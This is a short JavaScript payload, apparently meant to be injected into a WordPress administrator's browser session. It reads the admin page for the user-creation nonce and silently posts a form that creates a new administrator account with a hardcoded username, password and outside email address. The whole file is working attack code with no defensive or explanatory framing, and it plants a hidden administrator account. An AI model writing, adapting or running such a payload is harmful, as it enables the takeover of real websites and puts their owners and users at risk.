(function() {
    const newUsername = 'team-developer';
    const newPassword = 'Vendetta2025@@';
    const newEmail = 'belutgaban@protonmail.me'; 
    console.log("Payload executed. Attempting to create admin user...");
    fetch('/wp-admin/user-new.php', { credentials: 'include' })
        .then(response => response.text())
        .then(html => {
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, 'text/html');

            const nonceInput = doc.querySelector('input[name="_wpnonce_create-user"]');
            if (!nonceInput) {
                console.error("Could not find the user creation nonce. Aborting.");
                return;
            }
            const nonce = nonceInput.value;

            const formData = new FormData();
            formData.append('action', 'createuser');
            formData.append('_wpnonce_create-user', nonce);
            formData.append('_wp_http_referer', '/wp-admin/user-new.php');
            formData.append('user_login', newUsername);
            formData.append('email', newEmail);
            formData.append('first_name', 'Vendetta');
            formData.append('last_name', 'Admin');
            formData.append('url', '');
            formData.append('pass1', newPassword);
            formData.append('pass2', newPassword);
            formData.append('role', 'administrator');
            formData.append('createuser', 'Add New User');

            return fetch('/wp-admin/user-new.php', {
                method: 'POST',
                body: formData,
                credentials: 'include'
            });
        })
        .then(response => {
            if (response && response.ok) {
                console.log(`SUCCESS: Admin user '\${newUsername}' should be created.`);
            } else {
                console.error("FAILED: The server rejected the user creation request.");
            }
        })
        .catch(error => {
            console.error("An error occurred during the payload execution:", error);
        });
})();
